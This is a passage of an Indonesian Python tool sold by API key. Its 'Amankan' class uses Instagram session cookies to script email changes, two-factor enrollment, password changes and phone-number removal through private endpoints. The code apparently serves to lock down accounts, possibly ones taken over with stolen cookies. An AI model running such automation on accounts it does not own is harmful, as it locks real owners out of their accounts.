                    Console(width=71, style="bold royal_blue1").print(Panel(f"""[bold white]Bergabung :[bold green] {self.joined}
[bold white]Email :[bold blue] {self.email}
[bold white]Kadaluarsa :[bold yellow] {self.expired}""", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
                    with open('Data/Apikey.json', 'w') as w:
                        w.write(json.dumps({
                            "Apikey": apikey
                        }))
                    w.close()
                    time.sleep(3.5)
                    Menu().Utama(List = [])
                else:
                    exit()
            except (Exception):
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]{str(e).title()}!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Error) [bold green]<[bold yellow]<[bold red]<"))
                exit()
        elif query == '2' or query == '02':
            try:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Untuk Mendapatkan Apikey Trial Silahkan Hubungi Admin Di Whatsapp ([italic red]https://wa.me/6283847921480[italic white]) Atau Klik Enter Di Bawah Ini!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Dapatkan Apikey Trial) [bold green]<[bold yellow]<[bold red]<"))
                #Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Mendaftar Di ([italic green]https://instakey.rozhak.xyz/register/[italic white]) Lalu Isi Username, Email, Dan Password. Kemudian Login Atau Masuk Ke ([italic green]https://instakey.rozhak.xyz/getkey/[italic white]) Copy Apikey Nya.", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Dapatkan Apikey) [bold green]<[bold yellow]<[bold red]<"))
                #Console(style="bold royal_blue1").print(Columns([
                #    Panel("[bold green]60k in one month", width=35),
                #    Panel("[bold green]25k in one week", width=35),
                #]))
                #Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Untuk Mendapatkan[italic green] Apikey Trial[italic white] Kamu Harus Konfirmasi[italic yellow] Admin[italic white] Dahulu, Dengan Cara Mengirim Apikey Ke Whatsapp ([italic red]wa.me/6283847921480[italic white])", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Apikey Trial) [bold green]<[bold yellow]<[bold red]<"))
                Console().input("[bold white][[bold green]Get Apikey[bold white]]")
                os.system('xdg-open https://wa.me/6283847921480')
                exit()
            except (Exception, KeyboardInterrupt):
                exit()
        elif query == '3' or query == '03':
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Terimakasih Telah Menggunakan Tools Saya Dan Selamat Tinggal...", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Keluar) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(1.5)
            exit()
        else:
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic red]Pilihan Yang Kamu Masukan Tidak Ada Di Dalam Daftar Menu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Diketahui) [bold green]<[bold yellow]<[bold red]<"))
            time.sleep(3.5)
            self.Apikey()

    def Validasi(self, apikey, platform):
        with requests.Session() as r:
            r.headers.update({
                'accept-language': 'en-US,en;q=0.9',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Host': 'instakey.rozhak.xyz',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            })
            params = {
                'key': apikey,
                'dev': platform
            }
            response = json.loads(r.get('https://instakey.rozhak.xyz/check.php', params = params).text)
            if 'maaf key yang anda masukan tidak terdaftar diserver kami' in str(response):
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Apikey Yang Anda Masukan Tidak Terdaftar Diserver Kami!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Tidak Terdaftar) [bold green]<[bold yellow]<[bold red]<"))
                os.system('xdg-open https://wa.me/6283847921480')
                time.sleep(4.6)
                self.Apikey()
            else:
                if response['readtext'].lower() == 'sudah kadaluarsa':
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Apikey Sudah Kadaluarsa, Silahkan Upgrade Ke Premium!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Kadaluarsa) [bold green]<[bold yellow]<[bold red]<"))
                    time.sleep(3.5)
                    if os.path.exists('Data/Apikey.json') == True:
                        os.remove("Data/Apikey.json")
                    Buy_Apikey()
                else:
                    if response['status_device'] == 'pemakaian device sudah habis, jika anda menggantikan device lagi maka akan ketolak server':
                        Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Pemakaian Device Sudah Habis, Hubungi Author Untuk Reset Device!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Device Limit) [bold green]<[bold yellow]<[bold red]<"))
                        time.sleep(3.5)
                        self.Apikey()
                    elif response['usage'].lower() == 'trial':
                        #if os.path.exists('/data/data/com.termux/Cache.json') == False:
                            #try:
                                #with open('/data/data/com.termux/Cache.json', 'w') as w:
                                    #w.write(json.dumps({
                                        #'Apikey': apikey
                                    #}))
                                #w.close()
                            #except (IOError):
                                #Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Terminal Yang Anda Gunakan Tidak Terdeteksi Oleh Server Kami!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Kesalahan) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.5);self.Apikey()
                            return response['usage'], response['email'], response['join'].replace(' ','/'), response['expired'].replace(' ','/')
                        #else:
                            #if str(apikey) in str(json.loads(open('/data/data/com.termux/Cache.json', 'r').read())):
                                #return response['usage'], response['email'], response['join'].replace(' ','/'), response['expired'].replace(' ','/')
                            #else:
                                #Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Tampaknya Kamu Sudah Pernah Mencoba Apikey Trial Sebelumnya!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Free Trial Limit) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.5);Buy_Apikey()
                    else:
                        if response['status'] == 'berlaku':
                            return response['usage'], response['email'], response['join'].replace(' ','/'), response['expired'].replace(' ','/')
                        else:
                            Console().print("[bold royal_blue1]   ╰─>[bold red] Terjadi Kesalahaan Yang Tidak Diketahui!")
                            time.sleep(3.5)
                            self.Apikey()

class Amankan:

    def __init__(self) -> None:
        pass

    def Akun_Center(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-site': 'none',
                'Host': 'accountscenter.instagram.com',
            })
            response = r.get('https://accountscenter.instagram.com/profiles/', cookies = {
                'cookie': cookies
            }).text
            if 'administering_account_id' in str(response):
                return ("Akun Center")
            else:
                return ("Akun Biasa")

    def Ganti_Email_Biasa(self, cookies, new_email):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-dest': 'empty',
                'accept-language': 'en-US,en;q=0.9',
                'Host': 'www.instagram.com',
                'sec-fetch-mode': 'cors',
                'referer': 'https://www.instagram.com/accounts/edit/',
                'x-asbd-id': '198387',
                'x-ig-app-id': '936619743392459',
                'accept': '*/*',
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
            })
            response = json.loads(r.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/', cookies = {
                'cookie': cookies
            }).text)
            data = {
                'chaining_enabled': 'on',
                'external_url': '',
                'biography': '',
                'first_name': response['form_data']['first_name'],
                'email': new_email,
                'username': response['form_data']['username'],
                'phone_number': '',
            }
            r.headers.pop('x-ig-app-id')
            r.headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
            })
            response2 = r.post('https://www.instagram.com/api/v1/web/accounts/edit/', data = data, cookies = {
                'cookie': cookies
            }).text
            if '"status":"ok"' in str(response2):
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Link Konfirmasi[italic white] Yang Terkirim Ke Email Yang Kamu Masukan, Pastikan Link Sudah[italic red] Benar[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Konfirmasi Email) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                confirm_url = Console().input("[bold royal_blue1]   ╰─> ")
                if 'gateway.svk.jp' in str(confirm_url):
                    with requests.Session() as r:
                        r.headers.update({
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'en-US,en;q=0.9',
                            'Host': 'gateway.svk.jp',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                        })
                        response = r.get(confirm_url).text
                        self.confirm_url_next = re.search('location.href = "(.*?)";', str(response)).group(1)
                else:
                    self.confirm_url_next = confirm_url
                r.headers.clear()
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'referer': 'https://gateway.svk.jp/',
                    'sec-fetch-site': 'cross-site',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-dest': 'document',
                    'accept-language': 'en-US,en;q=0.9',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'Host': 'www.instagram.com',
                })
                response3 = r.get(self.confirm_url_next, cookies = {
                    'cookie': cookies
                })
                if 'accounts/confirm_email/' in str(response3.url):
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sukses Mengonfirmasi Email[italic green] {new_email}[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Gagal Mengonfirmasi Email Silahkan Konfirmasi Secara Manual!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Gagal) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
            elif 'Another account is using the same email.' in str(response2):
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Email Yang Kamu Masukan Telah Digunakan Atau Telah Terdaftar!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sudah Digunakan) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Gagal Mengubah Email Kemungkinan Akun Kamu Terken Checkpoint!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Gagal) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Ganti_Email_Center(self, cookies, new_email):
        with requests.Session() as r:
            r.headers.update({
                'Host': 'accountscenter.instagram.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-site': 'same-origin',
            })
            response = r.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies = {
                'cookie': cookies
            }).text

            self.x_fb_lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response)).group(1)
            self.x_ig_app_id = re.search('{"X-IG-App-ID":"(\d+)"}', str(response)).group(1)
            self.av = re.search('"actorID":"(\d+)"', str(response)).group(1)
            self.__hs = re.search('"haste_session":"(.*?)"', str(response)).group(1)
            self.__rev = re.search('"__spin_r":(\d+),', str(response)).group(1)
            self.fb_dtsg = re.search('{"token":"(.*?)"}', str(response)).group(1)
            self.__spin_r__spin_b__spin_t = re.findall('"__spin_r":(\d+),"__spin_b":"(.*?)","__spin_t":(\d+),', str(response))

            r.headers.update({
                'x-fb-friendly-name': 'FXAccountsCenterAddContactPointMutation',
                'sec-fetch-mode': 'cors',
                'origin': 'https://accountscenter.instagram.com',
                'x-fb-lsd': self.x_fb_lsd,
                'sec-fetch-dest': 'empty',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'referer': 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point',
                'x-asbd-id': '198387',
                'x-ig-app-id': self.x_ig_app_id,
            })
            data = {
                'fb_api_req_friendly_name': 'FXAccountsCenterAddContactPointMutation',
                'doc_id': '5790402044410935',
                '__ccg': 'GOOD',
                'variables': '{"country":"ID","contact_point":"' + str(new_email) + '","contact_point_type":"email","selected_accounts":["' + str(self.av) + '"],"family_device_id":"device_id_fetch_ig_did","client_mutation_id":""}',
                'lsd': self.x_fb_lsd,
                'av': self.av,
                '__spin_r': self.__spin_r__spin_b__spin_t[0][0],
                '__user': '0',
                '__comet_req': '24',
                'server_timestamps': True,
                '__a': '1',
                'fb_dtsg': self.fb_dtsg,
                '__req': 'h',
                '__spin_b': self.__spin_r__spin_b__spin_t[0][1],
                'jazoest': '26369',
                '__hs': self.__hs,
                'dpr': '1.5',
                '__spin_t': self.__spin_r__spin_b__spin_t[0][2],
                '__rev': self.__rev,
                'fb_api_caller_class': 'RelayModern',
            }
            response2 = r.post('https://accountscenter.instagram.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            }).text
            if '"success":true' in str(response2):
                Console(width=71, style="bold royal_blue1").print(Panel("[italic white]Silahkan Masukan[italic green] Kode Konfirmasi[italic white] Yang Terkirim Ke Email Yang Kamu Masukan, Pastikan Kode Sudah[italic red] Benar[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Kode Konfirmasi) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
                code_otp = Console().input("[bold royal_blue1]   ╰─> ")
                r.headers.update({
                    'x-fb-friendly-name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation',
                })
                data.update({
                    'fb_api_req_friendly_name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation',
                    '__req': 'o',
                    'variables': '{"contact_point":"' + str(new_email) + '","contact_point_type":"email","pin_code":"' + str(code_otp) + '","selected_accounts":["' + str(self.av) + '"],"family_device_id":"device_id_fetch_ig_did","client_mutation_id":"","contact_point_event_type":"ADD","normalized_contact_point_to_replace":""}',
                    'doc_id': '5820111908082635',
                })
                response3 = r.post('https://accountscenter.instagram.com/api/graphql/', data = data, cookies = {
                    'cookie': cookies
                }).text
                if '"success":true' in str(response3):
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sukses Mengonfirmasi Email[italic green] {new_email}[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Gagal Mengonfirmasi Email Silahkan Konfirmasi Secara Manual!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Gagal) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Gagal Mengubah Email Kemungkinan Akun Kamu Terkena Checkpoint!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Gagal) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Autentikasi_2_Faktor_Center(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-site': 'none',
                'Host': 'accountscenter.instagram.com',
            })
            response = r.get('https://accountscenter.instagram.com/password_and_security/two_factor/', cookies = {
                'cookie': cookies
            }).text
            self.x_fb_lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response)).group(1)
            self.x_ig_app_id = re.search('{"X-IG-App-ID":"(\d+)"}', str(response)).group(1)
            self.av = re.search('"actorID":"(\d+)"', str(response)).group(1)
            self.__hs = re.search('"haste_session":"(.*?)"', str(response)).group(1)
            self.__rev = re.search('"__spin_r":(\d+),', str(response)).group(1)
            self.fb_dtsg = re.search('{"token":"(.*?)"}', str(response)).group(1)
            self.__spin_r__spin_b__spin_t = re.findall('"__spin_r":(\d+),"__spin_b":"(.*?)","__spin_t":(\d+),', str(response))
            self.client_mutation_id = str(uuid.uuid1())
            data = {
                'fb_api_req_friendly_name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
                'doc_id': '9018559631489271',
                '__ccg': 'GOOD',
                'variables': '{"input":{"client_mutation_id":"' + self.client_mutation_id + '","actor_id":"' + str(self.av) + '","account_id":"' + str(self.av) + '","account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}',
                'lsd': self.x_fb_lsd,
                'av': self.av,
                '__spin_r':self. __spin_r__spin_b__spin_t[0][0],
                '__user': '0',
                '__comet_req': '24',
                'server_timestamps': True,
                '__a': '1',
                'fb_dtsg': self.fb_dtsg,
                '__req': 'j',
                '__spin_b': self.__spin_r__spin_b__spin_t[0][1],
                'jazoest': '26369',
                '__hs': self.__hs,
                'dpr': '1.5',
                '__spin_t':self. __spin_r__spin_b__spin_t[0][2],
                '__rev': self.__rev,
                'fb_api_caller_class': 'RelayModern',
            }
            r.headers.update({
                'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
                'sec-fetch-mode': 'cors',
                'origin': 'https://accountscenter.instagram.com',
                'x-fb-lsd': self.x_fb_lsd,
                'sec-fetch-dest': 'empty',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'referer': 'https://accountscenter.instagram.com/password_and_security/two_factor/',
                'x-asbd-id': '198387',
                'x-ig-app-id': self.x_ig_app_id,
            })
            response2 = r.post('https://accountscenter.instagram.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            }).json()['data']['xfb_two_factor_generate_totp_key']['totp_key']
            self.key_id, self.key_text = response2['key_id'], response2['key_text']
            Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Silahkan Masukan Kode ([italic green]{self.key_text}[italic white]) Autentikasi Ke Aplikasi[italic red] Pengesah Google[italic white], Jika Sudah Masukan[italic green] Kode[italic white] Yang Di Dapat Dari Aplikasi Pengesah Google!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Kode Autentikasi) [bold green]<[bold yellow]<[bold red]<", subtitle="[bold royal_blue1]╭────", subtitle_align='left'))
            verification_code = Console().input("[bold royal_blue1]   ╰─> ")

            r.headers.update({
                'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
            })
            data.update({
                'fb_api_req_friendly_name': 'useFXSettingsTwoFactorEnableTOTPMutation',
                '__req': 'q',
                'variables': '{"input":{"client_mutation_id":"' + self.client_mutation_id + '","actor_id":"' + str(self.av) + '","account_id":"' + str(self.av) + '","account_type":"INSTAGRAM","verification_code":"' + verification_code + '","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}',
                'doc_id': '6654417307907293',
            })
            response2 = r.post('https://accountscenter.instagram.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            }).text
            if '"success":true' in str(response2):
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic green]Sukses Menambahkan Autentikasi 2 Faktor Di Akun Instagram Kamu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Gagal Menambahkan Autentikasi 2 Faktor Mungkin Kode Anda Salah!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Gagal) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Ubah_Password_Biasa(self, cookies, old_password, new_password):
        with requests.Session() as r:
            r.headers.update({
                'x-csrftoken': re.search('csrftoken=(.*?);', str(cookies)).group(1),
                'sec-fetch-site': 'same-origin',
                'origin': 'https://www.instagram.com',
                'accept-language': 'en-US,en;q=0.9',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/accounts/password/change/',
                'Host': 'www.instagram.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-mode': 'cors',
            })
            data = {
                'enc_new_password2': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.datetime.timestamp(datetime.datetime.now()))}:{new_password}',
                'enc_old_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.datetime.timestamp(datetime.datetime.now()))}:{old_password}', 
                'enc_new_password1': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.datetime.timestamp(datetime.datetime.now()))}:{new_password}',
            }
            response = r.post('https://www.instagram.com/api/v1/web/accounts/password/change/', data = data, cookies = {
                'cookie': cookies
            }).text
            if '"status":"ok"' in str(response):
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sukses Mengubah Password Menjadi[italic green] {new_password}[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Gagal Mengubah Password Kemungkinan Akun Kamu Terkena Checkpoint!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Gagal) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Ubah_Password_Center(self, cookies, old_password, new_password):
        with requests.Session() as r:
            r.headers.update({
                'Host': 'accountscenter.instagram.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'referer': 'https://www.instagram.com/',
                'sec-fetch-site': 'same-origin',
            })
            response = r.get('https://accountscenter.instagram.com/password_and_security/password/change/', cookies = {
                'cookie': cookies
            }).text
            self.x_fb_lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response)).group(1)
            self.x_ig_app_id = re.search('{"X-IG-App-ID":"(\d+)"}', str(response)).group(1)
            self.av = re.search('"actorID":"(\d+)"', str(response)).group(1)
            self.__hs = re.search('"haste_session":"(.*?)"', str(response)).group(1)
            self.__rev = re.search('"__spin_r":(\d+),', str(response)).group(1)
            self.fb_dtsg = re.search('{"token":"(.*?)"}', str(response)).group(1)
            self.__spin_r__spin_b__spin_t = re.findall('"__spin_r":(\d+),"__spin_b":"(.*?)","__spin_t":(\d+),', str(response))

            data = {
                'fb_api_req_friendly_name': 'useFXSettingsChangePasswordMutation',
                'doc_id': '4872350656193366',
                '__ccg': 'GOOD',
                'variables': '{"account_id":"' + str(self.av) + '","account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":"#PWD_BROWSER:0:' + str(self.__spin_r__spin_b__spin_t[0][2]) + ':' + old_password + '"},"new_password_enc":{"sensitive_string_value":"#PWD_BROWSER:0:' + str(self.__spin_r__spin_b__spin_t[0][2]) + ':' + new_password + '"},"new_password_confirm_enc":{"sensitive_string_value":"#PWD_BROWSER:0:' + str(self.__spin_r__spin_b__spin_t[0][2]) + ':' + new_password + '"},"client_mutation_id":"' + str(uuid.uuid1()) + '"}',
                'lsd': self.x_fb_lsd,
                'av': self.av,
                '__spin_r': self.__spin_r__spin_b__spin_t[0][0],
                '__user': '0',
                '__comet_req': '24',
                'server_timestamps': True,
                '__a': '1',
                'fb_dtsg': self.fb_dtsg,
                '__req': 'l',
                '__spin_b': self.__spin_r__spin_b__spin_t[0][1],
                'jazoest': '26158',
                '__hs':self. __hs,
                'dpr': '1.5',
                '__spin_t': self.__spin_r__spin_b__spin_t[0][2],
                '__rev': self.__rev,
                'fb_api_caller_class': 'RelayModern',
            }
            r.headers.update({
                'x-fb-friendly-name': 'useFXSettingsChangePasswordMutation',
                'sec-fetch-mode': 'cors',
                'origin': 'https://accountscenter.instagram.com',
                'x-fb-lsd': self.x_fb_lsd,
                'sec-fetch-dest': 'empty',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'referer': 'https://accountscenter.instagram.com/password_and_security/password/change/',
                'x-asbd-id': '198387',
                'x-ig-app-id': self.x_ig_app_id,
            })
            response2 = r.post('https://accountscenter.instagram.com/api/graphql/', data = data, cookies = {
                'cookie': cookies
            }).text
            if '"success":true' in str(response2):
                Console(width=71, style="bold royal_blue1").print(Panel(f"[italic white]Sukses Mengubah Password Menjadi[italic green] {new_password}[italic white]!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            elif 'Your old password was entered incorrectly' in str(response2):
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Gagal Mengubah Password Karena Password Lama Yang Dimasukan Salah!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Password Salah) [bold green]<[bold yellow]<[bold red]<"))
                exit()
            else:
                Console(width=71, style="bold royal_blue1").print(Panel("[italic red]Gagal Mengubah Password Kemungkinan Akun Kamu Terkena Checkpoint!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Gagal) [bold green]<[bold yellow]<[bold red]<"))
                exit()

    def Hapus_Nomor_Center(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                'sec-fetch-site': 'none',
                'Host': 'accountscenter.instagram.com',
            })
            response = r.get('https://accountscenter.instagram.com/personal_info/contact_points/', cookies = {
                'cookie': cookies
            }).text
            if 'PHONE_NUMBER' in str(response):
                self.x_fb_lsd = re.search('\\["LSD",\\[\\],{"token":"(.*?)"}', str(response)).group(1)
                self.x_ig_app_id = re.search('{"X-IG-App-ID":"(\d+)"}', str(response)).group(1)
                self.av = re.search('"actorID":"(\d+)"', str(response)).group(1)
                self.__hs = re.search('"haste_session":"(.*?)"', str(response)).group(1)
                self.__rev = re.search('"__spin_r":(\d+),', str(response)).group(1)
                self.fb_dtsg = re.search('{"token":"(.*?)"}', str(response)).group(1)
                self.__spin_r__spin_b__spin_t = re.findall('"__spin_r":(\d+),"__spin_b":"(.*?)","__spin_t":(\d+),', str(response))
                self.normalized_contact_point = re.search('"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(response)).group(1)
                data = {
                    'fb_api_req_friendly_name': 'FXAccountsCenterDeleteContactPointMutation',
                    'doc_id': '5700400280028979',
                    '__ccg': 'GOOD',
                    'variables': '{"normalized_contact_point":"' + str(self.normalized_contact_point) + '","contact_point_type":"PHONE_NUMBER","selected_accounts":["' + str(self.av) + '"],"client_mutation_id":"","family_device_id":"device_id_fetch_ig_did"}',
                    'lsd': self.x_fb_lsd,
                    'av': self.av,
                    '__spin_r': self.__spin_r__spin_b__spin_t[0][0],
                    '__user': '0',
                    '__comet_req': '24',
                    'server_timestamps': True,
                    '__a': '1',
                    'fb_dtsg': self.fb_dtsg,
                    '__req': 'l',
                    '__spin_b': self.__spin_r__spin_b__spin_t[0][1],
                    'jazoest': '26175',
                    '__hs': self.__hs,
                    'dpr': '1.5',
                    '__spin_t': self.__spin_r__spin_b__spin_t[0][2],
                    '__rev': self.__rev,
                    'fb_api_caller_class': 'RelayModern',
                }
                r.headers.update({
                    'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation',
                    'sec-fetch-mode': 'cors',
                    'origin': 'https://accountscenter.instagram.com',
                    'x-fb-lsd': self.x_fb_lsd,
                    'sec-fetch-dest': 'empty',
                    'content-type': 'application/x-www-form-urlencoded',
                    'accept': '*/*',
                    'referer': 'https://accountscenter.instagram.com/personal_info/contact_points/',
                    'x-asbd-id': '198387',
                    'x-ig-app-id': self.x_ig_app_id,
                })
                response2 = r.post('https://accountscenter.instagram.com/api/graphql/', data = data, cookies = {
                    'cookie': cookies
                }).text
                if '"success":true' in str(response2):
                    Console(width=71, style="bold royal_blue1").print(Panel(f"[italic green]Sukses Menghapus Nomor Telpon Di Akun Instagram Kamu!", title="[bold red]>[bold yellow]>[bold green]>[bold royal_blue1] (Sukses) [bold green]<[bold yellow]<[bold red]<"))
                    exit()
                else:
